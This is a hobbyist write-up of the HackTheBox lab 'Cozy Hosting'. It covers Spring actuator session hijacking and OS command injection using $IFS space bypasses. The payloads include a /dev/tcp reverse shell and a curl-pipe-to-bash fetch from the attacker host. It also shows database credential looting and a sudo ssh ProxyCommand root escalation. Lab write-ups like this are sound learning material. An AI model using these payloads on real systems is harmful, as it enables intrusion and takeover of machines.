# Writeup for HackTheBox's Cozy Hosting

Difficulty: Easy
My first HTB boxes

## Set up and the recon: 
First thing first, I put the entry for the box into /etc/hosts file:
```
$ sudo echo "10.10.***.*** cozyhosting.thm" >> /etc/hosts
```
Then do nmap
```
$ nmap -A cozyhosting.thm
```
Apart from 22 and 80 which are usually discovered, strangely I found port 6666 with python and http on it. So I quickly go to http://cozyhosting:6666 before even going to the normal page on port 80 and found a directory listing, which contains the a jar *cloudhosting-0.0.1.jar*. Later on I found out this might be from some people also playing the room and hosting it after they have done some exploit. 

I downloaded the jar, open an Intellij project, add the jar as an external libraries. Intellij automatically decompiled the jar, and luckily I didn't have to deal with a bunch of var1, var2,.. var100. The code is pretty easy to read. I skimmed through the files looking for secrets, and found this thing in the class BOOT-INF/classes/scheduled/FakeUser:
```
Runtime.getRuntime().exec(new String[]{"curl", "localhost:8080/login", "--request", "POST", "--header", "Content-Type: application/x-www-form-urlencoded", "--data-raw", "username=kanderson&password=MRdEQuv6~6P9", "-v"});
```
Go on the real website and copy paste that to the login page: 
<div style="text-align:center">
<img width="359" alt="image" src="https://github.com/VinhPham2106/VinhPham2106.github.io/assets/111932850/3eb5ff37-0da6-49a0-ab40-f9453273b3de">
And we got in the admin page:
<img width="1280" alt="image" src="https://github.com/VinhPham2106/VinhPham2106.github.io/assets/111932850/e18769e6-4641-443b-bc96-228b1982dde7">
</div>
This is not a good way to learn, so I went back out and try again.

## Real enumeration
Well real enumeration started with directory discovery:
```
ffuf -w wordlist.txt -u http://cozyhosting.htb/FUZZ
```
We only got trivial ones that we know like *admin, login, ...* so that wasn't helpful. I also assumed that subdomain enumeration isn't necessary. One thing from the leaked jar is that this is a Spring boot web app. Quickly go on the goated Hacktrick's [website](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/spring-actuators) for Spring boot we found the golden resource. You can read about that in details, but the main thing is that Spring Boot have endpoints that allow the monitoring of the application in real time. Navigate to the **/actuators** endpoint we got a juicy json:
```
{
  "_links": {
    "self": {
      "href": "http://localhost:8080/actuator",
      "templated": false
    },
    "sessions": {
      "href": "http://localhost:8080/actuator/sessions",
      "templated": false
    },
    "beans": {
      "href": "http://localhost:8080/actuator/beans",
      "templated": false
    },
    "health-path": {
      "href": "http://localhost:8080/actuator/health/{*path}",
      "templated": true
    },
    "health": {
      "href": "http://localhost:8080/actuator/health",
      "templated": false
    },
    "env": {
      "href": "http://localhost:8080/actuator/env",
      "templated": false
    },
    "env-toMatch": {
      "href": "http://localhost:8080/actuator/env/{toMatch}",
      "templated": true
    },
    "mappings": {
      "href": "http://localhost:8080/actuator/mappings",
      "templated": false
    }
  }
}
```
From some Spring coding experience (some knowledge of beans and dependency injection and all that stuff) I knew that I won't go to the beans xD. Going to sessions reveal juicy secrets:
```
{
  "BA794D68AFFDF8D2A93F686EFEEA463D": "UNAUTHORIZED",
  "584EA6477A473F15F207930878E281E9": "UNAUTHORIZED",
  "68B36106FC871812D75EB36D1001201F": "UNAUTHORIZED",
  "D4F556CA33D3050573FA675DA349E0E2": "UNAUTHORIZED",
  "485378D72063CD212E62A522C4DCF675": "kanderson",
  "92FA653C4F2390013EB68A369E08E963": "UNAUTHORIZED",
  "D1467CB12DF15E0EDA55305029178826": "UNAUTHORIZED",
  "A9E5DA7A05B7B6E037A71F23E7A4B7F8": "UNAUTHORIZED",
  "72B48649056560DE28EE3108B3B3B38C": "UNAUTHORIZED",
  "6C2515E611FD7B93C7FE6C3610359D2A": "UNAUTHORIZED"
}
```
Well I suppose that's how we log in as Anderson. Looking at the login requests, I saw what cookie is being set and just use the sessionID provided to login.

## Gaining access
Again, I'll explain from the aspect of having the leaked jar first, and after that how it was supposed to be done.
Looking through classes from the leaked jar, we found shell command execution with sanitization:
```
public void executeOverSsh(@RequestParam("username") String username, @RequestParam("host") String host, HttpServletResponse response) throws IOException {
        StringBuilder rbuilder = new StringBuilder("/admin?error=");

        try {
            this.validateHost(host);
            this.validateUserName(username);
            Process process = Runtime.getRuntime().exec(new String[]{"/bin/bash", "-c", String.format("ssh -o ConnectTimeout=1 %s@%s", username, host)});
            (new BufferedReader(new InputStreamReader(process.getErrorStream()))).lines().forEach((line) -> {
                if (!line.startsWith("Pseudo-terminal")) {
                    rbuilder.append(line);
                }

            });
        } catch (IllegalArgumentException var10) {
            rbuilder.append(var10.getMessage());
        } catch (Exception var11) {
            rbuilder.append("ssh: Cannot connect to the host");
        } finally {
            response.sendRedirect(rbuilder.toString());
        }

    }
```
Corresponding the input fields on the admin page. Let's look at the sanitizations:
```
// Regex to match for host
private final Pattern HOST_PATTERN = Pattern.compile("^(?=.{1,255}$)[0-9A-Za-z](?:(?:[0-9A-Za-z]|-){0,61}[0-9A-Za-z])?(?:\\.[0-9A-Za-z](?:(?:[0-9A-Za-z]|-){0,61}[0-9A-Za-z])?)*\\.?$");

// Can't contain space
private void validateUserName(String username) {
        if (username.contains(" ")) {
            throw new IllegalArgumentException("Username can't contain whitespaces!");
        }
    }

// Check matching regex
private void validateHost(String host) {
        if (!this.HOST_PATTERN.matcher(host).matches()) {
            throw new IllegalArgumentException("Invalid hostname!");
        }
    }
```
After consulting with ChatGPT, I concluded that the regex cannot be bypass, and it's easier to OS command injection with the username field. So I search up how to bypass space filter for OS command injection, and again [HackTrick](https://book.hacktricks.xyz/linux-hardening/bypass-bash-restrictions) is goat (as always). The main conclusion is that we can represent spaces as $IFS, which is the internal field separator variable. There's this bracket trick as well, I recommend you to read it up in the HackTrick link.

Time for reverse shell right? On pwnbox I hosted a listener at port 9999, and I tried doing the short bash reverse shell directly on the username.
```
username=;/bin/bash$IFS-i$IFS>&$IFS/dev/tcp/[IP]/9999$IFS0>&1;
```
Had to get some help to get it to work, here's the payload and the contributors:
```
# Consulting other ppl's writeups
# First host a server that has a rev.sh file on [IP]:8888, then the payload would be:
username=;curl$IFS10.10.14.15:8888/rev.sh$IFS|$IFSbash;

# Consulting Ethical Hackers of Purdue people
username=;echo$IFS<base64 bash shell>|base64$IFS-d|bash
# They also suggested using the brackets as well
```
Got the shell, current user is app, go into home and there's user josh. But let's go back a bit to how to discover that the web app is vulnerable to OS command injection.
First thing: we get the error returned fully with the ?error parameter.
Second: We get invalid host if we don't match the regex. It can be a rabbithole trying to bypass the regex, or if it's possible it's gonna take a while while.
Thirdly: If our username has spaces, it will tell.

## Lateral movement.
There's no user kanderson on the system, but there's josh. The jar leaked us this very useful information about database
```
spring.jpa.database=POSTGRESQL
spring.datasource.platform=postgres
spring.datasource.url=jdbc:postgresql://localhost:5432/cozyhosting
spring.datasource.username=postgres
spring.datasource.password=Vg&nvzAQ7XxR
```

Honestly I've not deal with postgres almost at all before this box, so I had to read up on how to do things.
So within our shell, let's open the postgres terminal
```
$ psql -U postgres -d cozyhosting -h localhost -W
```
I needed all these flags. Username, database, host, force password prompt.
Inside the postgres terminals, we use these commands to see list of tables and content of tables:
```
\dt
SELECT * from users;
```
I am getting lazy now, you get kanderson and admin as users and there password hashes. Copied admin's hash to my local machine, used john and the rockyou file gives me the password. Glory glory ... Glory glory ...

So to save pwnbox free time I shut it down and ssh into josh@cozyhosting.htb from my terminal
That's the user flag owned

## Privilege Escalation
I was a bit disappointed with this one. So sudo -l works, we can use ssh NOPASSWD. GTFObin gives us this command that I used and get root and root.txt:
```
$ sudo ssh -o ProxyCommand=';sh 0<&2 1>&2' x
```
A bit of explaintion per chatGPT:
```
ProxyCommand: The ProxyCommand is a configuration option in SSH that allows you to specify a command to execute to establish a connection to the target server. In this case, it's set to ;sh 0<&2 1>&2.
```
And the command execution is the input output redirection for root access.

### Pretty tough one with great learning rewards till the privilege escalation part.



